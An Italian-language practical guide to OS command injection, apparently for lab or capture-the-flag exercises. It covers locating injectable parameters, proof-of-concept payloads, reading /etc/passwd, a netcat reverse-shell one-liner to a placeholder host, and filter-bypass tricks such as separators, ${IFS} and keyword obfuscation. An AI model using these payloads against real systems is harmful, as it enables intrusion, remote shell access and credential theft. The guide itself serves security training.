# Guida Pratica: OS Command Injection

## 1. Cos'è e Dove si Trova
La Command Injection avviene quando un'applicazione web prende l'input dell'utente e lo passa direttamente (senza controlli) a una shell di sistema (es. tramite funzioni come `system()`, `exec()`, o `os.popen()`). 

**Dove cercarla negli esercizi:**
* Form che fanno palesemente operazioni di rete (es. tool di "Ping", "Traceroute", "Nslookup").
* Endpoint che leggono o manipolano file passati via parametro. Esempio: `http://10.3.3.1:5000/browse/stat?filepath=nomefile.txt`.

---

## 2. Metodologia: Come Risolvere l'Esercizio Step-by-Step

### Step 1: Identificare il comportamento normale
Prima di attaccare, capisci cosa si aspetta il server. Se l'input è `127.0.0.1` e l'output è il risultato di un ping, sai che il comando base sotto al cofano è probabilmente `ping -c 4 127.0.0.1`. Il tuo obiettivo è accodare il tuo comando a quello originale.

### Step 2: Il Test Base (Proof of Concept)
Invia l'input previsto seguito da un separatore e da un comando "innocuo" (come `id` o `whoami`). 
* *Payload:* `127.0.0.1 ; id`
* *Payload alternativo:* `127.0.0.1 || whoami` (utile se vuoi che il tuo comando parta solo se il primo fallisce, es. dando un IP falso come `999.999.999.999 || id`).

### Step 3: Leggere la Risposta e Adattarsi (Fuzzing)
Guarda cosa risponde il server (se necessario usa Burp Suite per vedere la response HTTP grezza):
* **Caso A (Win):** Vedi `uid=33(www-data)`. L'injection funziona, non ci sono filtri. Passa allo Step 4.
* **Caso B (Errore di Filtro):** Il server dice "Carattere ; non consentito" o dà un Bad Request. Qui scatta la fase di **Bypass** (Vedi Sezione 3). Prova a cambiare separatore, a togliere gli spazi o a mascherare i comandi. Costruisci il payload un pezzetto alla volta per capire esattamente quale carattere fa scattare il blocco.

### Step 4: L'Obiettivo Finale (Esfiltrazione o Shell)
Una volta confermato che puoi eseguire comandi (RCE), punta all'obiettivo dell'esercizio:
* **Leggere file sensibili:** `127.0.0.1 ; cat /etc/passwd`
* **Cercare flag:** `127.0.0.1 ; find / -name "*flag*" 2>/dev/null`
* **Reverse Shell:** Se devi prendere il controllo totale, inietta un comando bash o netcat per farti mandare una shell (es. `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TUO_IP TUA_PORTA >/tmp/f`).

*(Nota sull'URL Encoding: Se stai iniettando via parametro GET nell'URL, i caratteri speciali come `&`, `;`, spazi, ecc. vanno codificati! Esempio: uno spazio diventa `%20`, una `&` diventa `%26`)*.

---

## 3. Toolkit di Sopravvivenza: Bypass dei Filtri

Quando lo Step 3 fallisce, usa queste tecniche.

### A. Bypass Separatori di Comandi
| Carattere | URL Encoded | Quando usarlo |
| :--- | :--- | :--- |
| `;` | `%3B` | Base: esegue in sequenza. |
| `\|` | `%7C` | Pipe: l'output del primo va al secondo. |
| `&&` | `%26%26` | Esegue il secondo SOLO se il primo ha successo. |
| `\|\|` | `%7C%7C` | Esegue il secondo SOLO se il primo fallisce. |
| `\n` | `%0a` | Newline: Equivale a "Invio". Ignorato da molti filtri! |
| `` ` `` | `%60` | Backtick: subshell (es. `` `id` ``). |
| `$()` | `%24%28...%29`| Subshell classica (es. `$(id)`). |

*L'ordine consigliato di test è:* `;` ➔ `|` ➔ `%0a` ➔ `$(...)` ➔ `` ` ``.

### B. Bypass degli Spazi
Se il server blocca gli spazi (es. regex su `\s`):
* Variabile `${IFS}`: `cat${IFS}/etc/passwd`
* Ridirezione `<`: `cat</etc/passwd`

### C. Offuscamento Parole Chiave (Nomi File / Comandi)
Se il firewall blocca `cat`, `etc`, `passwd`:
* **Apici singoli/doppi:** `ca't' /e"tc"/pass"wd"`
* **Backslash:** `c\a\t /e\t\c/p\a\s\s\w\d`
* **Variabili vuote (`$@` o `${x}`):** `c$@at /e${x}tc/pa${x}sswd`
* **Wildcard:** `cat /etc/p?sswd` o `cat /etc/pass*`
* **Path Traversal nascosti:** `||tail%20%22/etc/passwd%22`